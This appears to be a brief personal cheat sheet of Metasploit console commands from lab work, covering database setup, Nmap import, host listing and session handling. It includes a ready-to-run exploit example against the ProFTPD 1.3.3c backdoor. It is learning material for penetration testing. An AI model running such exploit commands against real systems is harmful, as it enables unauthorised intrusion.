# Metasploit

## What is Metasploit?

Metasploit is a framework used for penetration testing and exploiting vulnerabilities.
I used it during labs to understand how attacks work.

---

## Start Metasploit

```bash
msfconsole
```

---

## Database

```bash
service postgresql start
msfconsole
db_status
```

Start the database and check if it's connected.

---

## Import Nmap Results

```bash
db_import scan.xml
```

Import scan results from Nmap.

---

## View Targets

```bash
hosts
services
```

Shows discovered hosts and services.

---

## Basic Exploit Example

```bash
use exploit/unix/ftp/proftpd_133c_backdoor
set RHOSTS target
exploit
```

---

## Useful Commands

```bash
search exploit
use exploit/...
show options
set RHOSTS target
run
```

---

## Sessions

```bash
sessions
sessions -i 1
```

Used to manage active sessions.

---

## Notes

* Always check options before running
* Some modules may not work directly
* Use only in lab environments

> Tested during lab environments

